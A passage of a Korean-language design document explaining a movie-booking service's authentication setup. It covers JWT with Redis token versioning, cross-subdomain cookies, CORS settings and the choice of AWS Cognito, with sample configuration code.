  <span class="hljs-comment">// → 일반 API는 JWT 만료(1시간)까지 접근 가능 (성능 유지)</span>
}


<span class="hljs-comment">// 6. 강제 로그아웃 (관리자 기능)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">forceLogout</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-comment">// token_version 즉시 무효화</span>
  <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`token_version:<span class="hljs-subst">${userId}</span>`</span>);

  <span class="hljs-comment">// 로그 기록</span>
  <span class="hljs-keyword">await</span> auditLog.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">action</span>: <span class="hljs-string">'FORCE_LOGOUT'</span>,
    <span class="hljs-attr">target_user</span>: userId,
    <span class="hljs-attr">admin_user</span>: adminId,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  });
}
</code></pre>
<p><strong>검증 수준별 API 분류</strong>:</p>
<pre><code class="lang-yaml"><span class="hljs-attr">Level 1:</span> <span class="hljs-string">Stateless</span> <span class="hljs-string">(JWT</span> <span class="hljs-string">서명</span> <span class="hljs-string">검증만)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GET</span> <span class="hljs-string">/v1/movies</span> <span class="hljs-string">(영화</span> <span class="hljs-string">목록</span> <span class="hljs-string">조회)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GET</span> <span class="hljs-string">/v1/theaters</span> <span class="hljs-string">(극장</span> <span class="hljs-string">목록</span> <span class="hljs-string">조회)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GET</span> <span class="hljs-string">/v1/showtimes</span> <span class="hljs-string">(상영</span> <span class="hljs-string">시간표</span> <span class="hljs-string">조회)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Redis</span> <span class="hljs-string">조회</span> <span class="hljs-string">없음,</span> <span class="hljs-string">최고</span> <span class="hljs-string">성능</span>

<span class="hljs-attr">Level 2:</span> <span class="hljs-string">Hybrid</span> <span class="hljs-string">(JWT</span> <span class="hljs-string">+</span> <span class="hljs-string">Redis</span> <span class="hljs-string">token_version)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">POST</span> <span class="hljs-string">/v1/payments</span> <span class="hljs-string">(결제</span> <span class="hljs-string">처리)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GET</span> <span class="hljs-string">/v1/bookings/history</span> <span class="hljs-string">(예매</span> <span class="hljs-string">히스토리)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">POST</span> <span class="hljs-string">/v1/bookings</span> <span class="hljs-string">(예매</span> <span class="hljs-string">생성)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">PUT</span> <span class="hljs-string">/v1/users/profile</span> <span class="hljs-string">(개인정보</span> <span class="hljs-string">변경)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DELETE</span> <span class="hljs-string">/v1/users/account</span> <span class="hljs-string">(계정</span> <span class="hljs-string">삭제)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Redis</span> <span class="hljs-number">1</span><span class="hljs-string">회</span> <span class="hljs-string">조회,</span> <span class="hljs-string">보안</span> <span class="hljs-string">강화</span>

<span class="hljs-attr">Level 3:</span> <span class="hljs-string">Full</span> <span class="hljs-string">Validation</span> <span class="hljs-string">(JWT</span> <span class="hljs-string">+</span> <span class="hljs-string">Redis</span> <span class="hljs-string">+</span> <span class="hljs-string">DB)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">POST</span> <span class="hljs-string">/v1/admin/users/ban</span> <span class="hljs-string">(사용자</span> <span class="hljs-string">정지)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GET</span> <span class="hljs-string">/v1/admin/audit-logs</span> <span class="hljs-string">(감사</span> <span class="hljs-string">로그)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">PUT</span> <span class="hljs-string">/v1/admin/permissions</span> <span class="hljs-string">(권한</span> <span class="hljs-string">변경)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Redis</span> <span class="hljs-string">+</span> <span class="hljs-string">DB</span> <span class="hljs-string">조회,</span> <span class="hljs-string">최고</span> <span class="hljs-string">보안</span>
</code></pre>
<p><strong>장점</strong>:</p>
<ul>
<li>✅ 대부분의 요청: Stateless 유지 (확장성 우수)</li>
<li>✅ 민감한 작업: 즉시 무효화 가능 (보안 강화)</li>
<li>✅ 선택적 Redis 조회 (성능과 보안 균형)</li>
<li>✅ 일반 사용자 영향 최소화 (로그아웃 후 1시간 동안 영화 목록 조회 가능)</li>
<li>✅ 마이크로서비스 환경에 적합</li>
</ul>
<p><strong>단점 및 대응</strong>:</p>
<ul>
<li>⚠️ Redis 다운 시 민감한 API 접근 불가
→ Redis Cluster 구성으로 고가용성 확보</li>
<li>⚠️ token_version 불일치 시 사용자 경험 저하
→ 명확한 에러 메시지 제공 (재로그인 유도)</li>
</ul>
<hr></hr>
<h2 id="쿠키-선택의-기술적-근거">쿠키 선택의 기술적 근거</h2>
<h3 id="1-브라우저의-자동-쿠키-전송-메커니즘">1. 브라우저의 자동 쿠키 전송 메커니즘</h3>
<h4 id="쿠키-자동-전송-규칙">쿠키 자동 전송 규칙</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// 쿠키 설정</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...;
            <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>;
            <span class="hljs-title class_">Path</span>=/;
            <span class="hljs-title class_">HttpOnly</span>;
            <span class="hljs-title class_">Secure</span>;

<span class="hljs-comment">// 이후 모든 *.ddcn41.com 요청에 자동 포함</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/bookings'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc...</span>

<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://auth.ddcn41.com/v2/auth/me'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc...</span>

<span class="hljs-comment">// 자동 전송 조건:</span>
<span class="hljs-comment">// 1. Domain이 일치해야 함 (.ddcn41.com)</span>
<span class="hljs-comment">// 2. Path가 일치해야 함 (/ 이므로 모든 경로)</span>
<span class="hljs-comment">// 3. Secure 플래그 시 HTTPS 필수</span>
<span class="hljs-comment">// 4. SameSite 정책 준수</span>
</code></pre>
<h4 id="로컬스토리지-수동-전송-번거로움">로컬스토리지 수동 전송 (번거로움)</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// 모든 API 호출마다 수동으로 토큰 추가</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>);

<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/bookings'</span>, {
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
  }
});

<span class="hljs-comment">// 문제점:</span>
<span class="hljs-comment">// 1. 모든 API 클라이언트 코드에 추가 필요</span>
<span class="hljs-comment">// 2. 토큰 갱신 시 모든 코드 업데이트 필요</span>
<span class="hljs-comment">// 3. 에러 처리 복잡 (401 Unauthorized 처리)</span>
</code></pre>
<h3 id="2-cors와-credentials">2. CORS와 Credentials</h3>
<h4 id="쿠키-전송-시-cors-설정">쿠키 전송 시 CORS 설정</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Frontend: credentials 옵션 필요</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/bookings'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// 쿠키 전송 허용</span>
})

<span class="hljs-comment">// Backend (Spring): CORS 설정</span>
@<span class="hljs-title class_">Configuration</span>
public <span class="hljs-keyword">class</span> <span class="hljs-title class_">CorsConfig</span> implements <span class="hljs-title class_">WebMvcConfigurer</span> {
    @<span class="hljs-title class_">Override</span>
    public <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCorsMappings</span>(<span class="hljs-params">CorsRegistry registry</span>) {
        registry.<span class="hljs-title function_">addMapping</span>(<span class="hljs-string">"/**"</span>)
            .<span class="hljs-title function_">allowedOrigins</span>(
                <span class="hljs-string">"https://ddcn41.com"</span>,
                <span class="hljs-string">"https://accounts.ddcn41.com"</span>,
                <span class="hljs-string">"https://admin.ddcn41.com"</span>
            )
            .<span class="hljs-title function_">allowCredentials</span>(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// 쿠키 허용</span>
            .<span class="hljs-title function_">allowedMethods</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"POST"</span>, <span class="hljs-string">"PUT"</span>, <span class="hljs-string">"DELETE"</span>);
    }
}

<span class="hljs-comment">// Lambda (Node.js): CORS 헤더</span>
{
  <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'https://accounts.ddcn41.com'</span>,
  <span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>,
  <span class="hljs-string">'Access-Control-Allow-Methods'</span>: <span class="hljs-string">'GET, POST, OPTIONS'</span>,
}
</code></pre>
<p><strong>주의사항</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// ❌ 잘못된 설정 (작동 안 함)</span>
<span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>
<span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>
<span class="hljs-comment">// → 에러: Credential mode 'include' with '*' origin not allowed</span>

<span class="hljs-comment">// ✅ 올바른 설정</span>
<span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'https://accounts.ddcn41.com'</span>
<span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>
</code></pre>
<h3 id="3-브라우저-쿠키-제약-사항">3. 브라우저 쿠키 제약 사항</h3>
<h4 id="domain-설정-제약">Domain 설정 제약</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 Lambda 응답</span>

<span class="hljs-comment">// ✅ 가능: 현재 도메인</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">Domain</span>=accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>

<span class="hljs-comment">// ✅ 가능: 상위 도메인 (leading dot)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>

<span class="hljs-comment">// ❌ 불가: 다른 도메인</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">example</span>.<span class="hljs-property">com</span>
<span class="hljs-comment">// → 브라우저가 차단 (보안상 이유)</span>

<span class="hljs-comment">// ❌ 불가: 하위 도메인</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">Domain</span>=api.<span class="hljs-property">accounts</span>.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>
<span class="hljs-comment">// → 상위에서 하위로 설정 불가</span>
</code></pre>
<h4 id="samesite-정책">SameSite 정책</h4>
<blockquote>
<p><strong>참고</strong>: SameSite 속성에 대한 자세한 설명은 <a href="#csrf-cross-site-request-forgery-공격">보안 측면 비교 - CSRF 공격</a> 섹션 참조</p>
</blockquote>
<p><strong>우리 프로젝트 설정</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...;
            <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>;
            <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>;     <span class="hljs-comment">// CSRF 공격 완화 (GET 요청만 허용)</span>
            <span class="hljs-title class_">HttpOnly</span>;         <span class="hljs-comment">// XSS 방어</span>
            <span class="hljs-title class_">Secure</span>;           <span class="hljs-comment">// HTTPS 전용</span>
            <span class="hljs-title class_">Max</span>-<span class="hljs-title class_">Age</span>=<span class="hljs-number">3600</span>      <span class="hljs-comment">// 1시간</span>
</code></pre>
<h3 id="4-로컬스토리지의-한계">4. 로컬스토리지의 한계</h3>
<h4 id="cross-domain-토큰-공유-불가">Cross-Domain 토큰 공유 불가</h4>
<p><strong>시도 1: iframe 통신 (복잡하고 불안전)</strong></p>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com</span>
&lt;iframe id=<span class="hljs-string">"token-sync"</span> src=<span class="hljs-string">"https://ddcn41.com/sync"</span>&gt;&lt;/iframe&gt;

<span class="hljs-comment">// 토큰 전송</span>
<span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'token-sync'</span>);
iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-title function_">postMessage</span>({
  <span class="hljs-attr">type</span>: <span class="hljs-string">'SET_TOKEN'</span>,
  <span class="hljs-attr">token</span>: <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>)
}, <span class="hljs-string">'https://ddcn41.com'</span>);

<span class="hljs-comment">// ddcn41.com에서 수신</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'message'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> !== <span class="hljs-string">'https://accounts.ddcn41.com'</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'access_token'</span>, event.<span class="hljs-property">data</span>.<span class="hljs-property">token</span>);
});

<span class="hljs-comment">// 문제점:</span>
<span class="hljs-comment">// 1. iframe 로딩 시간 필요</span>
<span class="hljs-comment">// 2. postMessage 보안 위험 (origin 검증 필수)</span>
<span class="hljs-comment">// 3. 브라우저 호환성 문제</span>
</code></pre>
<p><strong>시도 2: 서버 중계 (복잡하고 비효율적)</strong></p>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 로그인 성공</span>
<span class="hljs-variable constant_">POST</span> /auth/create-redirect-token
<span class="hljs-title class_">Body</span>: { <span class="hljs-attr">token</span>: <span class="hljs-string">'eyJhbGc...'</span>, <span class="hljs-attr">redirectTo</span>: <span class="hljs-string">'https://ddcn41.com'</span> }

<span class="hljs-comment">// 서버에서 임시 토큰 생성</span>
<span class="hljs-keyword">const</span> tempCode = <span class="hljs-title function_">generateRandomCode</span>();
redis.<span class="hljs-title function_">set</span>(tempCode, token, <span class="hljs-string">'EX'</span>, <span class="hljs-number">60</span>); <span class="hljs-comment">// 1분 유효</span>

<span class="hljs-comment">// 리다이렉트</span>
<span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com/receive-token?code=temp123</span>

<span class="hljs-comment">// ddcn41.com에서 토큰 교환</span>
<span class="hljs-variable constant_">GET</span> /receive-token?code=temp123
→ 서버에서 <span class="hljs-title class_">Redis</span> 조회
→ 토큰 반환
→ <span class="hljs-variable language_">localStorage</span>에 저장

<span class="hljs-comment">// 문제점:</span>
<span class="hljs-comment">// 1. 2번의 네트워크 요청 (느림)</span>
<span class="hljs-comment">// 2. Redis 등 별도 저장소 필요</span>
<span class="hljs-comment">// 3. 경합 조건 (Race Condition) 가능</span>
</code></pre>
<p><strong>쿠키 방식 (간단)</strong></p>
<pre><code class="lang-javascript"><span class="hljs-comment">// accounts.ddcn41.com에서 로그인 성공</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;

<span class="hljs-comment">// ddcn41.com으로 리다이렉트</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'https://ddcn41.com'</span>;

<span class="hljs-comment">// 끝! 추가 코드 불필요</span>
<span class="hljs-comment">// 브라우저가 자동으로 쿠키를 *.ddcn41.com 모든 요청에 포함</span>
</code></pre>
<hr></hr>
<h2 id="aws-cognito-선택-이유">AWS Cognito 선택 이유</h2>
<h3 id="1-aws-생태계-통합">1. AWS 생태계 통합</h3>
<h4 id="cloudwatch와의-완벽한-통합">CloudWatch와의 완벽한 통합</h4>
<pre><code class="lang-yaml"><span class="hljs-string">자동</span> <span class="hljs-string">로깅:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Cognito</span> <span class="hljs-string">User</span> <span class="hljs-string">Pool</span> <span class="hljs-string">이벤트</span> <span class="hljs-string">→</span> <span class="hljs-string">CloudWatch</span> <span class="hljs-string">Logs</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">SignUp,</span> <span class="hljs-string">SignIn,</span> <span class="hljs-string">ForgotPassword</span> <span class="hljs-string">등</span> <span class="hljs-string">모든</span> <span class="hljs-string">이벤트</span> <span class="hljs-string">자동</span> <span class="hljs-string">기록</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">로그</span> <span class="hljs-string">그룹:</span> <span class="hljs-string">/aws/cognito/userpool/{pool-id}</span>

<span class="hljs-string">로그</span> <span class="hljs-string">예시:</span>
  {
    <span class="hljs-attr">"eventType":</span> <span class="hljs-string">"SignIn_Success"</span>,
    <span class="hljs-attr">"userPoolId":</span> <span class="hljs-string">"ap-northeast-2_XXXXX"</span>,
    <span class="hljs-attr">"userName":</span> <span class="hljs-string">"user@example.com"</span>,
    <span class="hljs-attr">"clientId":</span> <span class="hljs-string">"abc123"</span>,
    <span class="hljs-attr">"sourceIpAddress":</span> <span class="hljs-string">"123.45.67.89"</span>,
    <span class="hljs-attr">"timestamp":</span> <span class="hljs-string">"2025-01-13T12:34:56.789Z"</span>
  }
</code></pre>
<h4 id="lambda-triggers로-커스터마이징">Lambda Triggers로 커스터마이징</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Pre-Authentication Trigger</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// 로그인 전 커스텀 검증</span>
  <span class="hljs-keyword">const</span> { userPoolId, userName, request } = event;

  <span class="hljs-comment">// 예: 특정 IP만 허용</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAllowedIP</span>(request.<span class="hljs-property">userContextData</span>.<span class="hljs-property">sourceIp</span>)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'IP not allowed'</span>);
  }

  <span class="hljs-comment">// 예: 비즈니스 로직 검증</span>
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserFromDB</span>(userName);
  <span class="hljs-keyword">if</span> (user.<span class="hljs-property">status</span> === <span class="hljs-string">'SUSPENDED'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Account suspended'</span>);
  }

  <span class="hljs-keyword">return</span> event;
}

<span class="hljs-comment">// Post-Authentication Trigger</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// 로그인 성공 후 처리</span>
  <span class="hljs-keyword">const</span> { userName } = event;

  <span class="hljs-comment">// 예: 로그인 시간 기록</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateLastLogin</span>(userName);

  <span class="hljs-comment">// 예: SNS 알림 발송</span>
  <span class="hljs-keyword">await</span> sns.<span class="hljs-title function_">publish</span>({
    <span class="hljs-title class_">TopicArn</span>: <span class="hljs-string">'arn:aws:sns:ap-northeast-2:xxxxx:login-alerts'</span>,
    <span class="hljs-title class_">Message</span>: <span class="hljs-string">`User <span class="hljs-subst">${userName}</span> logged in`</span>,
  });

  <span class="hljs-keyword">return</span> event;
}

<span class="hljs-comment">// Token Generation Trigger</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// JWT 클레임 수정</span>
  event.<span class="hljs-property">response</span> = {
    <span class="hljs-attr">claimsOverrideDetails</span>: {
      <span class="hljs-attr">claimsToAddOrOverride</span>: {
        <span class="hljs-string">'custom:role'</span>: <span class="hljs-string">'ADMIN'</span>,
        <span class="hljs-string">'custom:department'</span>: <span class="hljs-string">'Engineering'</span>
      }
    }
  };

  <span class="hljs-keyword">return</span> event;
}
</code></pre>
<p><strong>지원되는 Triggers</strong>:</p>
<ul>
<li>Pre-Authentication: 로그인 전 검증</li>
<li>Post-Authentication: 로그인 후 처리</li>
<li>Pre-Token Generation: JWT 클레임 수정</li>
<li>Post-Confirmation: 회원가입 확인 후 처리</li>
<li>User Migration: 기존 사용자 마이그레이션</li>
<li>Custom Message: 이메일/SMS 커스터마이징</li>
</ul>
<h3 id="2-비용-효율성">2. 비용 효율성</h3>
<h4 id="가격-구조">가격 구조</h4>
<pre><code class="lang-yaml"><span class="hljs-string">무료</span> <span class="hljs-string">티어:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">월</span> <span class="hljs-string">활성</span> <span class="hljs-string">사용자</span> <span class="hljs-string">(MAU)</span> <span class="hljs-number">10</span><span class="hljs-string">,000명까지</span> <span class="hljs-string">무료</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">MAU:</span> <span class="hljs-string">Monthly</span> <span class="hljs-string">Active</span> <span class="hljs-string">Users</span> <span class="hljs-string">(한</span> <span class="hljs-string">달</span> <span class="hljs-string">동안</span> <span class="hljs-string">한</span> <span class="hljs-string">번</span> <span class="hljs-string">이상</span> <span class="hljs-string">로그인한</span> <span class="hljs-string">사용자)</span>

<span class="hljs-string">유료</span> <span class="hljs-string">(MAU</span> <span class="hljs-string">초과</span> <span class="hljs-string">시):</span>
  <span class="hljs-bullet">-</span> <span class="hljs-number">10</span><span class="hljs-string">,001</span> <span class="hljs-string">~</span> <span class="hljs-number">50</span><span class="hljs-string">,000:</span> <span class="hljs-string">$0.0055/MAU</span>
  <span class="hljs-bullet">-</span> <span class="hljs-number">50</span><span class="hljs-string">,001</span> <span class="hljs-string">~</span> <span class="hljs-number">100</span><span class="hljs-string">,000:</span> <span class="hljs-string">$0.0046/MAU</span>
  <span class="hljs-bullet">-</span> <span class="hljs-number">100</span><span class="hljs-string">,001+:</span> <span class="hljs-string">$0.00325/MAU</span>

<span class="hljs-string">예시</span> <span class="hljs-string">계산:</span>
  <span class="hljs-comment"># 테스트 환경 (MAU: 100명)</span>
  <span class="hljs-string">월</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$0</span> <span class="hljs-string">(무료</span> <span class="hljs-string">티어)</span>

  <span class="hljs-comment"># 소규모 서비스 (MAU: 5,000명)</span>
  <span class="hljs-string">월</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$0</span> <span class="hljs-string">(무료</span> <span class="hljs-string">티어)</span>

  <span class="hljs-comment"># 중규모 서비스 (MAU: 20,000명)</span>
  <span class="hljs-string">초과</span> <span class="hljs-string">사용자:</span> <span class="hljs-number">10</span><span class="hljs-string">,000명</span>
  <span class="hljs-string">월</span> <span class="hljs-string">비용:</span> <span class="hljs-number">10</span><span class="hljs-string">,000</span> <span class="hljs-string">×</span> <span class="hljs-string">$0.0055</span> <span class="hljs-string">=</span> <span class="hljs-string">$55</span>

  <span class="hljs-comment"># 대규모 서비스 (MAU: 100,000명)</span>
  <span class="hljs-number">10</span><span class="hljs-string">,001~50,000:</span> <span class="hljs-number">40</span><span class="hljs-string">,000</span> <span class="hljs-string">×</span> <span class="hljs-string">$0.0055</span> <span class="hljs-string">=</span> <span class="hljs-string">$220</span>
  <span class="hljs-number">50</span><span class="hljs-string">,001~100,000:</span> <span class="hljs-number">50</span><span class="hljs-string">,000</span> <span class="hljs-string">×</span> <span class="hljs-string">$0.0046</span> <span class="hljs-string">=</span> <span class="hljs-string">$230</span>
  <span class="hljs-string">월</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$450</span>
</code></pre>
<p><strong>비교: 자체 구축 vs Cognito</strong></p>
<pre><code class="lang-yaml"><span class="hljs-string">자체</span> <span class="hljs-string">인증</span> <span class="hljs-string">서버</span> <span class="hljs-string">구축:</span>
  <span class="hljs-string">EC2</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$50/월</span> <span class="hljs-string">(t3.medium)</span>
  <span class="hljs-string">RDS</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$30/월</span> <span class="hljs-string">(PostgreSQL)</span>
  <span class="hljs-string">개발</span> <span class="hljs-string">시간:</span> <span class="hljs-number">2</span><span class="hljs-number">-3</span><span class="hljs-string">주</span> <span class="hljs-string">(인건비</span> <span class="hljs-string">$3,000+)</span>
  <span class="hljs-string">유지보수:</span> <span class="hljs-string">지속적</span> <span class="hljs-string">패치</span> <span class="hljs-string">및</span> <span class="hljs-string">모니터링</span>
  <span class="hljs-string">보안</span> <span class="hljs-string">감사:</span> <span class="hljs-string">연</span> <span class="hljs-number">1</span><span class="hljs-string">회</span> <span class="hljs-string">이상</span> <span class="hljs-string">($1,000+)</span>
  <span class="hljs-string">총</span> <span class="hljs-number">1</span><span class="hljs-string">년</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$1,000</span> <span class="hljs-string">+</span> <span class="hljs-string">$3,000</span> <span class="hljs-string">(개발)</span> <span class="hljs-string">+</span> <span class="hljs-string">$1,000</span> <span class="hljs-string">(보안)</span> <span class="hljs-string">=</span> <span class="hljs-string">$5,000+</span>

<span class="hljs-string">Cognito</span> <span class="hljs-string">(MAU</span> <span class="hljs-number">5</span><span class="hljs-string">,000):</span>
  <span class="hljs-string">월</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$0</span> <span class="hljs-string">(무료)</span>
  <span class="hljs-string">개발</span> <span class="hljs-string">시간:</span> <span class="hljs-number">1</span><span class="hljs-string">주</span> <span class="hljs-string">(통합</span> <span class="hljs-string">작업)</span>
  <span class="hljs-string">유지보수:</span> <span class="hljs-string">AWS</span> <span class="hljs-string">자동</span> <span class="hljs-string">관리</span>
  <span class="hljs-string">보안</span> <span class="hljs-string">감사:</span> <span class="hljs-string">AWS</span> <span class="hljs-string">SOC2/ISO</span> <span class="hljs-string">인증</span>
  <span class="hljs-string">총</span> <span class="hljs-number">1</span><span class="hljs-string">년</span> <span class="hljs-string">비용:</span> <span class="hljs-string">~$500</span> <span class="hljs-string">(통합</span> <span class="hljs-string">작업만)</span>
</code></pre>
<h3 id="3-확장성과-유연성">3. 확장성과 유연성</h3>
<h4 id="mfa-multi-factor-authentication-추가">MFA (Multi-Factor Authentication) 추가</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Cognito User Pool 설정</span>
aws cognito-idp update-user-pool \
  --user-pool-id ap-northeast-2_XXXXX \
  --mfa-configuration <span class="hljs-variable constant_">OPTIONAL</span> \
  --sms-configuration <span class="hljs-string">'{
    "SnsCallerArn": "arn:aws:iam::xxxxx:role/CognitoSNSRole",
    "ExternalId": "ddcn41-cognito"
  }'</span>

<span class="hljs-comment">// 사용자가 MFA 활성화 시</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> cognitoClient.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SetUserMFAPreferenceCommand</span>({
  <span class="hljs-title class_">AccessToken</span>: userAccessToken,
  <span class="hljs-title class_">SMSMfaSettings</span>: {
    <span class="hljs-title class_">Enabled</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-title class_">PreferredMfa</span>: <span class="hljs-literal">true</span>
  }
}));

<span class="hljs-comment">// 로그인 시 자동으로 MFA 요구</span>
<span class="hljs-comment">// → SMS 인증 코드 전송</span>
<span class="hljs-comment">// → 사용자 입력 후 로그인 완료</span>
</code></pre>
<h4 id="social-login-oauth-통합">Social Login (OAuth) 통합</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Google OAuth 연동</span>
aws cognito-idp update-identity-provider \
  --user-pool-id ap-northeast-2_XXXXX \
  --provider-name <span class="hljs-title class_">Google</span> \
  --provider-details <span class="hljs-string">'{
    "client_id": "google_client_id",
    "client_secret": "google_client_secret",
    "authorize_scopes": "openid email profile"
  }'</span>

<span class="hljs-comment">// Facebook, Apple, SAML 등도 동일하게 추가 가능</span>

<span class="hljs-comment">// Hosted UI에서 자동으로 "Google로 로그인" 버튼 표시</span>
<span class="hljs-comment">// → 사용자 클릭</span>
<span class="hljs-comment">// → Google 인증 페이지</span>
<span class="hljs-comment">// → 인증 완료 후 Cognito에 사용자 생성</span>
<span class="hljs-comment">// → JWT 토큰 발급</span>
</code></pre>
<h4 id="사용자-그룹-및-권한-관리">사용자 그룹 및 권한 관리</h4>
